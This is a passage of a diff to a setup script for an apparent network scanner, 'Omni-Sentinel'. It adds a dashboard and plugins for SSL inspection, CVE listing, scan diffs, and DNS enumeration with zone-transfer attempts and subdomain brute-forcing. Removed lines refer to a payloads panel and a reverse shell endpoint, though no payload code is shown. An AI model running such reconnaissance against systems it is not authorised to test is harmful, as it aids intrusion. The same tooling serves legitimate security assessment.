+      </div>
+      <div style={{ display: "flex", gap: 8, marginBottom: 16, alignItems: "center" }}>
+        <input style={{ ...S.input, flex: 1, maxWidth: 360, margin: 0 }} placeholder="Tags (comma-separated)" value={tagInput} onChange={e => setTagInput(e.target.value)} />
+        <button style={{ ...S.btn, padding: "8px 12px" }} onClick={saveTags}>Save Tags</button>
+      </div>
+      {msg.text && <p style={{ color: msg.ok ? "#22c55e" : "#ef4444", marginBottom: 12 }}>{msg.text}</p>}
+
+      <div style={{ display: "flex", gap: 2, marginBottom: 16, borderBottom: "1px solid #334155" }}>
+        {TABS.map(t => (
+          <button key={t} onClick={() => { setTab(t); if (t === "timeline") loadTimeline(); }}
+            style={{ ...S.tabBtn, ...(tab === t ? S.tabActive : {}) }}>
+            {t.charAt(0).toUpperCase() + t.slice(1)}
           </button>
         ))}
       </div>
-      <section>
-        <h2>Payloads</h2>
-        {Object.entries(payloads).map(([name, value]) => (
-          <article key={name} style={{ marginBottom: "1rem" }}>
-            <h3>{name}</h3>
-            <pre style={{ background: "#111", color: "#0f0", padding: "0.75rem", overflowX: "auto", borderRadius: "4px" }}>{value}</pre>
-          </article>
-        ))}
-      </section>
-    </main>
+
+      {tab === "overview" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>Open Services ({Object.keys(services).length})</h3>
+          {Object.keys(services).length === 0 && <p style={{ color: "#64748b" }}>No services found yet — scan may still be running</p>}
+          {Object.entries(services).map(([port, info]) => {
+            const portCves = cves[port] || [];
+            const hasCrit = portCves.some(c => c.severity === "CRITICAL");
+            return (
+              <div key={port} style={{ ...S.card, marginBottom: 10, borderLeft: `3px solid ${hasCrit ? "#ef4444" : "#334155"}` }}>
+                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                  <strong style={{ color: "#38bdf8" }}>:{port}/{info.proto || "tcp"} — {info.service} {info.product} {info.version}</strong>
+                  {portCves.length > 0 && <span style={{ color: hasCrit ? "#ef4444" : "#f59e0b", fontSize: 13 }}>{portCves.length} CVE(s)</span>}
+                </div>
+                {portCves.map(cve => (
+                  <div key={cve.id} style={{ marginTop: 6, fontSize: 12, padding: "4px 8px", background: "#0f172a", borderRadius: 4 }}>
+                    <strong style={{ color: cve.severity === "CRITICAL" ? "#ef4444" : cve.severity === "HIGH" ? "#f59e0b" : "#94a3b8" }}>{cve.id}</strong>
+                    {" "}(CVSS: {cve.score}, {cve.severity}): {cve.description?.slice(0, 150)}
+                  </div>
+                ))}
+              </div>
+            );
+          })}
+        </div>
+      )}
+
+      {tab === "timeline" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>Timeline</h3>
+          {timeline.length === 0 && <p style={{ color: "#64748b" }}>Loading events...</p>}
+          {timeline.map((e, i) => (
+            <div key={i} style={{ display: "flex", gap: 12, marginBottom: 8, fontSize: 13 }}>
+              <span style={{ color: "#64748b", flexShrink: 0, minWidth: 160 }}>{e.created_at}</span>
+              <span style={{ color: "#94a3b8", flexShrink: 0 }}>[{e.actor}]</span>
+              <span><strong style={{ color: "#38bdf8" }}>{e.event}</strong>{e.detail ? `: ${e.detail}` : ""}</span>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {tab === "ssl" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>SSL/TLS Inspector</h3>
+          <div style={{ display: "flex", gap: 8, marginBottom: 16, alignItems: "center" }}>
+            <input type="number" style={{ ...S.input, width: 100, margin: 0 }} value={sslPort} onChange={e => setSslPort(Number(e.target.value))} placeholder="Port" />
+            <button style={S.btn} onClick={runSsl}>Inspect</button>
+          </div>
+          {ssl && (
+            <div style={S.card}>
+              <p style={{ margin: "0 0 8px" }}>Reachable: <strong style={{ color: ssl.reachable ? "#22c55e" : "#ef4444" }}>{ssl.reachable ? "Yes" : "No"}</strong></p>
+              {ssl.error && <p style={{ color: "#ef4444" }}>Error: {ssl.error}</p>}
+              {ssl.reachable && (
+                <>
+                  <p style={{ margin: "0 0 6px" }}>Protocol: <code>{ssl.protocol}</code></p>
+                  <p style={{ margin: "0 0 6px" }}>Cipher: <code style={{ color: ssl.weak_cipher ? "#ef4444" : "#22c55e" }}>{ssl.cipher}{ssl.weak_cipher ? " ⚠ WEAK" : ""}</code></p>
+                  <p style={{ margin: "0 0 6px" }}>Expires: {ssl.not_after} — <strong style={{ color: ssl.expired ? "#ef4444" : ssl.days_remaining < 30 ? "#f59e0b" : "#22c55e" }}>{ssl.days_remaining} days remaining</strong></p>
+                  <p style={{ margin: "0 0 6px" }}>Subject: {ssl.subject?.commonName || JSON.stringify(ssl.subject)}</p>
+                  <p style={{ margin: "0 0 6px" }}>Issuer: {ssl.issuer?.organizationName || JSON.stringify(ssl.issuer)}</p>
+                  {ssl.san?.length > 0 && <p style={{ margin: 0 }}>SANs: {ssl.san.join(", ")}</p>}
+                </>
+              )}
+            </div>
+          )}
+        </div>
+      )}
+
+      {tab === "dns" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>DNS Enumeration</h3>
+          <button style={S.btn} onClick={runDns}>Run DNS Enum</button>
+          {dns && (
+            <div style={{ marginTop: 16 }}>
+              <p style={{ color: "#94a3b8" }}>Domain: <code style={{ color: "#38bdf8" }}>{dns.domain}</code> — {dns.total} record(s) found</p>
+              {dns.zone_transfer?.length > 0 && (
+                <>
+                  <h4 style={{ color: "#f59e0b" }}>Zone Transfer Results</h4>
+                  {dns.zone_transfer.map((r, i) => <div key={i} style={{ fontSize: 13, color: "#f59e0b", marginBottom: 4 }}>{r.value}</div>)}
+                </>
+              )}
+              {dns.subdomains?.length > 0 && (
+                <>
+                  <h4>Subdomains</h4>
+                  {dns.subdomains.map((r, i) => (
+                    <div key={i} style={{ fontSize: 13, marginBottom: 6 }}>
+                      <code style={{ color: "#38bdf8" }}>{r.subdomain}</code> <span style={{ color: "#64748b" }}>→ {r.ips?.join(", ")}</span>
+                    </div>
+                  ))}
+                </>
+              )}
+              {dns.total === 0 && <p style={{ color: "#64748b" }}>No DNS records found</p>}
+            </div>
+          )}
+        </div>
+      )}
+
+      {tab === "diff" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>Scan Diff</h3>
+          <p style={{ color: "#64748b", fontSize: 13 }}>Compares this scan to the previous scan of the same target</p>
+          <button style={S.btn} onClick={runDiff}>Calculate Diff</button>
+          {diff && !diff.error && (
+            <div style={{ marginTop: 16 }}>
+              <div style={{ display: "flex", gap: 12, marginBottom: 16, flexWrap: "wrap" }}>
+                {[["New", diff.summary?.new, "#22c55e"], ["Closed", diff.summary?.closed, "#ef4444"], ["Changed", diff.summary?.changed, "#f59e0b"], ["Unchanged", diff.summary?.unchanged, "#64748b"]].map(([label, count, color]) => (
+                  <div key={label} style={{ ...S.card, textAlign: "center", minWidth: 90 }}>
+                    <div style={{ fontSize: 28, fontWeight: 700, color }}>{count}</div>
+                    <div style={{ fontSize: 12, color: "#94a3b8" }}>{label}</div>
+                  </div>
+                ))}
+              </div>
+              {Object.entries(diff.new_ports || {}).map(([port, info]) => (
+                <div key={port} style={{ ...S.card, marginBottom: 8, borderLeft: "3px solid #22c55e" }}>
+                  <strong style={{ color: "#22c55e" }}>+ NEW :{port} — {info.service} {info.version}</strong>
+                </div>
+              ))}
+              {Object.entries(diff.closed_ports || {}).map(([port, info]) => (
+                <div key={port} style={{ ...S.card, marginBottom: 8, borderLeft: "3px solid #ef4444" }}>
+                  <strong style={{ color: "#ef4444" }}>- CLOSED :{port} — {info.service} {info.version}</strong>
+                </div>
+              ))}
+              {Object.entries(diff.changed_services || {}).map(([port, changes]) => (
+                <div key={port} style={{ ...S.card, marginBottom: 8, borderLeft: "3px solid #f59e0b" }}>
+                  <strong style={{ color: "#f59e0b" }}>~ CHANGED :{port}</strong>
+                  {Object.entries(changes).map(([field, { before, after }]) => (
+                    <div key={field} style={{ fontSize: 13, marginTop: 4 }}>
+                      {field}: <span style={{ color: "#ef4444" }}>{before || "—"}</span> → <span style={{ color: "#22c55e" }}>{after || "—"}</span>
+                    </div>
+                  ))}
+                </div>
+              ))}
+              <p style={{ color: "#64748b", fontSize: 12, marginTop: 8 }}>Baseline scan ID: {diff.baseline_id}</p>
+            </div>
+          )}
+          {diff?.error && <p style={{ color: "#ef4444", marginTop: 12 }}>{diff.error}</p>}
+        </div>
+      )}
+
+      {tab === "notes" && (
+        <div>
+          <h3 style={{ marginTop: 0 }}>Analyst Notes</h3>
+          {(scan.notes || []).length === 0 && <p style={{ color: "#64748b" }}>No notes yet</p>}
+          {(scan.notes || []).map(n => (
+            <div key={n.id} style={{ ...S.card, marginBottom: 8 }}>
+              <div style={{ fontSize: 12, color: "#64748b", marginBottom: 4 }}>{n.author} @ {n.created_at}</div>
+              <div>{n.content}</div>
+            </div>
+          ))}
+          <div style={{ display: "flex", gap: 8, marginTop: 16 }}>
+            <textarea style={{ ...S.input, flex: 1, height: 80, resize: "vertical", fontFamily: "inherit", margin: 0 }} placeholder="Add a note..." value={note} onChange={e => setNote(e.target.value)} />
+            <button style={{ ...S.btn, alignSelf: "flex-end" }} onClick={addNote}>Add</button>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ── Settings ──────────────────────────────────────────────────────────────────
+function Settings({ api, onBack }) {
+  const [webhookUrl, setWebhookUrl] = useState("");
+  const [msg, setMsg] = useState("");
+
+  useEffect(() => {
+    api.get("/settings/webhook").then(({ data }) => setWebhookUrl(data.webhook_url || "")).catch(() => {});
+  }, [api]);
+
+  const save = async () => {
+    try {
+      await api.put("/settings/webhook", { url: webhookUrl });
+      setMsg("Saved");
+      setTimeout(() => setMsg(""), 2000);
+    } catch (e) { setMsg(`Error: ${e.message}`); }
+  };
+
+  return (
+    <div>
+      <button style={{ ...S.btn, background: "none", color: "#94a3b8", padding: "4px 0", marginBottom: 16 }} onClick={onBack}>← Back</button>
+      <h2>Settings</h2>
+      <h3 style={{ color: "#94a3b8", fontWeight: 500 }}>Webhook Notifications</h3>
+      <p style={{ color: "#64748b", fontSize: 13 }}>POST alerts are sent to this URL on scan completion and critical CVE detection. Supports Slack, Discord, or any HTTP endpoint.</p>
+      <div style={{ maxWidth: 500 }}>
+        <input style={S.input} placeholder="https://hooks.slack.com/..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)} />
+        <button style={S.btn} onClick={save}>Save</button>
+        {msg && <p style={{ color: msg.startsWith("Error") ? "#ef4444" : "#22c55e", marginTop: 8 }}>{msg}</p>}
+      </div>
+    </div>
+  );
+}
+
+// ── App Root ──────────────────────────────────────────────────────────────────
+export default function App() {
+  const [token, setToken] = useState(() => localStorage.getItem("omni_token") || "");
+  const [view, setView] = useState("list");
+  const [selectedScan, setSelectedScan] = useState(null);
+
+  const api = useMemo(() => createApi(token), [token]);
+
+  const login = (t) => { localStorage.setItem("omni_token", t); setToken(t); };
+  const logout = () => { localStorage.removeItem("omni_token"); setToken(""); setView("list"); };
+
+  if (!token) return <Login onLogin={login} />;
+
+  return (
+    <div style={S.page}>
+      <nav style={S.nav}>
+        <span style={{ fontWeight: 700, color: "#38bdf8", cursor: "pointer", marginRight: 8 }} onClick={() => setView("list")}>Omni-Sentinel V21.3</span>
+        <button style={{ ...S.btn, background: "none", color: view === "list" ? "#e2e8f0" : "#94a3b8", padding: "4px 10px" }} onClick={() => setView("list")}>Scans</button>
+        <button style={{ ...S.btn, background: "none", color: view === "settings" ? "#e2e8f0" : "#94a3b8", padding: "4px 10px" }} onClick={() => setView("settings")}>Settings</button>
+        <div style={{ flex: 1 }} />
+        <button style={{ ...S.btn, background: "#7f1d1d", padding: "4px 12px", fontSize: 12 }} onClick={logout}>Logout</button>
+      </nav>
+      <main style={S.main}>
+        {view === "list" && <ScanList api={api} onSelect={id => { setSelectedScan(id); setView("detail"); }} onNewScan={() => setView("new")} />}
+        {view === "new" && <NewScan api={api} onBack={() => setView("list")} onCreated={id => { setSelectedScan(id); setView("detail"); }} />}
+        {view === "detail" && selectedScan && <ScanDetail api={api} scanId={selectedScan} onBack={() => setView("list")} />}
+        {view === "settings" && <Settings api={api} onBack={() => setView("list")} />}
+      </main>
+    </div>
   );
 }
 JSX
@@ -1297,6 +2058,326 @@ screenshots/*.png
 .pytest_cache/
 GITIGNORE
 
+cat > "$BASE/plugins/report_generator.py" <<'PY'
+import json
+import logging
+from contextlib import closing
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+
+def build_report_text(scan_id: str) -> Optional[str]:
+    try:
+        with closing(get_db()) as db:
+            row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+            if not row:
+                return None
+            notes = db.execute(
+                "SELECT content, author, created_at FROM notes WHERE scan_id=? ORDER BY created_at",
+                (scan_id,),
+            ).fetchall()
+            timeline = db.execute(
+                "SELECT event, detail, actor, created_at FROM timeline WHERE scan_id=? ORDER BY created_at",
+                (scan_id,),
+            ).fetchall()
+
+        data = json.loads(row["data"] or "{}")
+        services = data.get("services", {})
+        cves = data.get("cves", {})
+
+        lines = [
+            "# Omni-Sentinel Scan Report",
+            "",
+            f"**Scan ID:** {row['id']}",
+            f"**Target:** {row['target']}",
+            f"**Status:** {row['status']}",
+            f"**OS Hint:** {row['os_hint'] or 'Unknown'}",
+            f"**Created:** {row['created_at']}",
+            f"**Tags:** {row['tags'] or '[]'}",
+            "",
+            f"## Open Services ({len(services)} found)",
+            "",
+        ]
+
+        for port, info in services.items():
+            lines.append(
+                f"### Port {port}/{info.get('proto', 'tcp')} — "
+                f"{info.get('service', 'unknown')} {info.get('version', '')}"
+            )
+            port_cves = cves.get(port, [])
+            if port_cves:
+                lines.append(f"**CVEs:** {len(port_cves)} found")
+                for cve in port_cves[:5]:
+                    desc = (cve.get("description") or "")[:120]
+                    lines.append(
+                        f"  - {cve.get('id')} "
+                        f"(CVSS: {cve.get('score')}, {cve.get('severity')}): {desc}"
+                    )
+            lines.append("")
+
+        if notes:
+            lines += ["## Analyst Notes", ""]
+            for note in notes:
+                lines.append(f"**{note['author']} @ {note['created_at']}:** {note['content']}")
+                lines.append("")
+
+        if timeline:
+            lines += ["## Timeline", ""]
+            for event in timeline:
+                lines.append(
+                    f"[{event['created_at']}] [{event['actor']}] "
+                    f"{event['event']}: {event['detail']}"
+                )
+
+        return "\n".join(lines)
+    except Exception as exc:
+        logger.error(f"Failed to build report for {scan_id}: {exc}")
+        return None
+PY
+
+cat > "$BASE/plugins/ssl_inspector.py" <<'PY'
+import logging
+import socket
+import ssl
+from datetime import datetime, timezone
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+WEAK_CIPHERS = {"RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "ANON"}
+
+
+def _is_weak(cipher_name: str) -> bool:
+    return any(weak in cipher_name.upper() for weak in WEAK_CIPHERS)
+
+
+def inspect_ssl(host: str, port: int = 443) -> dict:
+    result: dict = {
+        "host": host,
+        "port": port,
+        "reachable": False,
+        "error": None,
+        "subject": {},
+        "issuer": {},
+        "not_before": None,
+        "not_after": None,
+        "days_remaining": None,
+        "expired": False,
+        "protocol": None,
+        "cipher": None,
+        "weak_cipher": False,
+        "san": [],
+    }
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        with socket.create_connection((host, port), timeout=10) as sock:
+            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                result["reachable"] = True
+                result["protocol"] = ssock.version()
+                cipher_info = ssock.cipher()
+                if cipher_info:
+                    result["cipher"] = cipher_info[0]
+                    result["weak_cipher"] = _is_weak(cipher_info[0])
+                cert = ssock.getpeercert(binary_form=False) or {}
+                result["subject"] = dict(x[0] for x in cert.get("subject", []))
+                result["issuer"] = dict(x[0] for x in cert.get("issuer", []))
+                not_after_str = cert.get("notAfter", "")
+                not_before_str = cert.get("notBefore", "")
+                if not_after_str:
+                    not_after = datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
+                    result["not_after"] = not_after.isoformat()
+                    result["days_remaining"] = (not_after - datetime.now(timezone.utc)).days
+                    result["expired"] = result["days_remaining"] < 0
+                if not_before_str:
+                    result["not_before"] = datetime.strptime(
+                        not_before_str, "%b %d %H:%M:%S %Y %Z"
+                    ).replace(tzinfo=timezone.utc).isoformat()
+                result["san"] = [v for _, v in cert.get("subjectAltName", [])]
+    except (ssl.SSLError, socket.timeout, OSError) as exc:
+        result["error"] = str(exc)
+    return result
+PY
+
+cat > "$BASE/plugins/dns_enum.py" <<'PY'
+import logging
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+try:
+    import dns.query
+    import dns.resolver
+    import dns.zone
+    DNS_AVAILABLE = True
+except ImportError:
+    DNS_AVAILABLE = False
+
+COMMON_SUBDOMAINS = [
+    "www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "mx",
+    "admin", "portal", "api", "dev", "staging", "test", "vpn",
+    "remote", "ssh", "blog", "cdn", "static", "assets",
+]
+
+
+def zone_transfer(domain: str) -> list:
+    if not DNS_AVAILABLE:
+        return []
+    results = []
+    try:
+        ns_records = dns.resolver.resolve(domain, "NS")
+        for ns in ns_records:
+            ns_host = str(ns.target).rstrip(".")
+            try:
+                import socket
+                ns_ip = socket.gethostbyname(ns_host)
+                zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
+                for name in zone.nodes.keys():
+                    results.append({"type": "AXFR", "value": f"{name}.{domain}"})
+            except Exception:
+                continue
+    except Exception as exc:
+        logger.debug(f"Zone transfer failed for {domain}: {exc}")
+    return results
+
+
+def brute_subdomains(domain: str, wordlist: Optional[list] = None) -> list:
+    if not DNS_AVAILABLE:
+        return []
+    targets = wordlist or COMMON_SUBDOMAINS
+    results = []
+    resolver = dns.resolver.Resolver()
+    resolver.lifetime = 2.0
+    for sub in targets:
+        fqdn = f"{sub}.{domain}"
+        try:
+            answers = resolver.resolve(fqdn, "A")
+            results.append({"type": "A", "subdomain": fqdn, "ips": [str(r) for r in answers]})
+        except Exception:
+            continue
+    return results
+
+
+def enumerate_dns(domain: str) -> dict:
+    zt = zone_transfer(domain)
+    brute = brute_subdomains(domain)
+    return {
+        "domain": domain,
+        "zone_transfer": zt,
+        "subdomains": brute,
+        "total": len(zt) + len(brute),
+    }
+PY
+
+cat > "$BASE/plugins/webhook.py" <<'PY'
+import logging
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+
+def send_webhook(url: str, payload: dict, timeout: int = 10) -> bool:
+    if not url:
+        return False
+    try:
+        resp = requests.post(
+            url,
+            json=payload,
+            timeout=timeout,
+            headers={"Content-Type": "application/json"},
+        )
+        resp.raise_for_status()
+        return True
+    except requests.RequestException as exc:
+        logger.warning(f"Webhook delivery failed: {exc}")
+        return False
+PY
+
+cat > "$BASE/core/scan_diff.py" <<'PY'
+import json
+import logging
+from contextlib import closing
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+
+def _get_scan_services(scan_id: str) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT data FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row or not row["data"]:
+            return {}
+        return json.loads(row["data"]).get("services", {})
+
+
+def _get_previous_scan_id(target: str, exclude_id: str) -> Optional[str]:
+    with closing(get_db()) as db:
+        row = db.execute(
+            "SELECT id FROM scans WHERE target=? AND id!=? AND status='COMPLETE' ORDER BY created_at DESC LIMIT 1",
+            (target, exclude_id),
+        ).fetchone()
+        return row["id"] if row else None
+
+
+def diff_scans(scan_id: str, baseline_id: Optional[str] = None) -> dict:
+    try:
+        with closing(get_db()) as db:
+            current = db.execute(
+                "SELECT target, created_at FROM scans WHERE id=?", (scan_id,)
+            ).fetchone()
+            if not current:
+                return {"error": "Scan not found"}
+            if not baseline_id:
+                baseline_id = _get_previous_scan_id(current["target"], scan_id)
+            if not baseline_id:
+                return {"error": "No previous completed scan found for this target", "scan_id": scan_id}
+
+        current_services = _get_scan_services(scan_id)
+        baseline_services = _get_scan_services(baseline_id)
+
+        current_ports = set(current_services.keys())
+        baseline_ports = set(baseline_services.keys())
+        new_ports = current_ports - baseline_ports
+        closed_ports = baseline_ports - current_ports
+        common_ports = current_ports & baseline_ports
+
+        changed = {}
+        for port in common_ports:
+            c = current_services[port]
+            b = baseline_services[port]
+            port_changes = {
+                field: {"before": b.get(field), "after": c.get(field)}
+                for field in ("service", "version", "product")
+                if c.get(field) != b.get(field)
+            }
+            if port_changes:
+                changed[port] = port_changes
+
+        return {
+            "scan_id": scan_id,
+            "baseline_id": baseline_id,
+            "new_ports": {p: current_services[p] for p in new_ports},
+            "closed_ports": {p: baseline_services[p] for p in closed_ports},
+            "changed_services": changed,
+            "summary": {
+                "new": len(new_ports),
+                "closed": len(closed_ports),
+                "changed": len(changed),
+                "unchanged": len(common_ports) - len(changed),
+            },
+        }
+    except Exception as exc:
+        logger.error(f"Diff failed for {scan_id}: {exc}")
+        return {"error": str(exc)}
+PY
+
 cat > "$BASE/start.sh" <<'SH'
 #!/usr/bin/env bash
 set -euo pipefail
@@ -1342,17 +2423,28 @@ chmod +x "$BASE/start.sh"
 chmod +x "$BASE/core/__init__.py" "$BASE/plugins/__init__.py" "$BASE/dashboard/__init__.py" 2>/dev/null || true
 
 log "OK" "Scaffold written to $BASE and $UI"
-log "OK" "All critical bugs fixed:"
-log "OK" "  ✓ Environment variables now properly expanded"
-log "OK" "  ✓ Docker health checks added for all services"
-log "OK" "  ✓ Reverse shell endpoint now requires authentication"
-log "OK" "  ✓ CORS configured for API"
-log "OK" "  ✓ Database indexes added for performance"
-log "OK" "  ✓ Shell injection prevention in CLI arguments"
-log "OK" "  ✓ Timezone-aware datetime handling"
-log "OK" "  ✓ Comprehensive error handling throughout"
-log "OK" "  ✓ Multi-stage Docker builds for smaller images"
-log "OK" "  ✓ Input validation on all endpoints"
+log "OK" "Bugs fixed:"
+log "OK" "  ✓ import os moved to top of scanner.py"
+log "OK" "  ✓ CORS origin list now includes http:// prefix on 127.0.0.1"
+log "OK" "  ✓ Vite proxy now strips /api prefix before forwarding to API server"
+log "OK" "  ✓ npm ci double-run in UI Dockerfile removed"
+log "OK" "  ✓ Scan results now persisted to DB (status, data, os_hint)"
+log "OK" "  ✓ settings table added to DB for webhook URL storage"
+log "OK" "New features:"
+log "OK" "  ✓ POST /scans — create and queue new scans via API"
+log "OK" "  ✓ GET /scans — scan history with tag filtering"
+log "OK" "  ✓ GET /scans/{id}/timeline — per-scan event timeline"
+log "OK" "  ✓ PUT /scans/{id}/tags — tag management"
+log "OK" "  ✓ POST /scans/{id}/notes — analyst notes"
+log "OK" "  ✓ GET /scans/{id}/diff — diff vs previous scan of same target"
+log "OK" "  ✓ POST /scans/{id}/report — PDF and Markdown report download"
+log "OK" "  ✓ POST /scans/{id}/ssl — SSL/TLS certificate inspection"
+log "OK" "  ✓ POST /scans/{id}/dns — DNS enumeration and zone transfer"
+log "OK" "  ✓ POST /scheduled-scans — recurring scheduled scans"
+log "OK" "  ✓ PUT /settings/webhook — webhook URL for Slack/Discord alerts"
+log "OK" "  ✓ CVE enrichment now runs automatically during scans"
+log "OK" "  ✓ Full dashboard UI with scan history, timeline, diff, SSL, DNS, notes"
 warn "Run: $BASE/start.sh to start all services"
 warn "UI will be available at: http://localhost:5173"
 warn "API will be available at: http://localhost:8000"
+warn "Add NVD_API_KEY to $BASE/.env for higher CVE rate limits"
